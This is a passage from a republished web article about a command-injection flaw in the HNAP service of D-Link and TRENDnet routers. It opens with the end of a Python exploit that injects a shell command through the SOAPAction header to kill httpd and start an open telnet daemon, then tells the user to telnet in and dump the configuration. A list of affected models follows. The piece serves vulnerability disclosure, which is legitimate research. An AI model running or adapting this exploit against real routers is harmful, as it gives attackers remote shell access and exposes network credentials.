class="hljs-keyword">all</span></span> hung hnap processes ensures that we can # re-<span class="hljs-keyword"><span class="hljs-keyword">start</span></span> httpd later. command = "killall httpd; killall hnap; telnetd -p %s" % port headers = { "SOAPAction" : <span class="hljs-string"><span class="hljs-string">'"http://purenetworks.com/HNAP1/GetDeviceSettings/`%s`"'</span></span> % command, } req = urllib2.Request(url, <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, headers) try: urllib2.urlopen(req) <span class="hljs-keyword"><span class="hljs-keyword">raise</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Exception</span></span>("Unexpected response") <span class="hljs-keyword"><span class="hljs-keyword">except</span></span> httplib.BadStatusLine: print "Exploit sent, try telnetting to %s:%s!" % (ip, port) print "To dump all system settings, run (no quotes): 'xmldbc -d /var/config.xml; cat /var/config.xml'" sys.<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Exception</span></span>: print "Received an unexpected response from the server; exploit probably failed. :("</code> </pre> <br>  I checked this bug on firmware v1.00 and v1.03 (the last one at the time of this writing), and they are both vulnerable.  But, as is usually the case with most vulnerabilities in embedded, this code has fallen into the firmware of other devices. <br><br>  Analyzing all the firmware is quite tedious, so I passed the information about the bug to the <a href="http://tacnetsol.com/">Centrifuge</a> team, which have the distinction of a utility for automatic analysis of such things.  Centrifuge discovered this vulnerability in the following models: <br><ul><li>  DAP-1522 revB </li><li>  DAP-1650 revB </li><li>  DIR-880L </li><li>  DIR-865L </li><li>  DIR-860L revA </li><li>  DIR-860L revB </li><li>  DIR-815 revB </li><li>  DIR-300 revB </li><li>  DIR-600 revB </li><li>  DIR-645 </li><li>  TEW-751DR </li><li>  TEW-733GR </li></ul><br>  As far as I know, HNAP cannot be disabled on these devices in any way. <br><br>  UPDATE: It seems that at the beginning of the year the same bug was found by <a href="http://securityadvisories.dlink.com/security/publication.aspx%3Fname%3DSAP10051">Samuel Huntly</a> , but it was fixed only for DIR-645.  Patch pretty bad, wait for his analysis in the next post. </div><p>Source: <a href="https://habr.com/ru/post/256451/">https://habr.com/ru/post/256451/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../256437/index.html">Webinar recording: "Methods of protecting information based on Azure, Backup (Microsoft, Veeam, BackupExec) and Azure Site Recovery"</a></li>
<li><a href="../256439/index.html">Blending Modes in Unity</a></li>
<li><a href="../256441/index.html">Open access to research results</a></li>
<li><a href="../256443/index.html">Pointers in C ++. Introduction</a></li>
<li><a href="../256445/index.html">Performance evaluation of Django Session Engine configurations</a></li>
<li><a href="../256453/index.html">City laboratory of data analysis: we assemble a team</a></li>
<li><a href="../256459/index.html">Image and video analysis. Image classification and object recognition</a></li>
<li><a href="../256461/index.html">Where to get a half million for a cybersecurity startup</a></li>
<li><a href="../256463/index.html">Yandex has released antivirus for sites - Manul</a></li>
<li><a href="../256465/index.html">Program of the 2nd International Roboforum</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>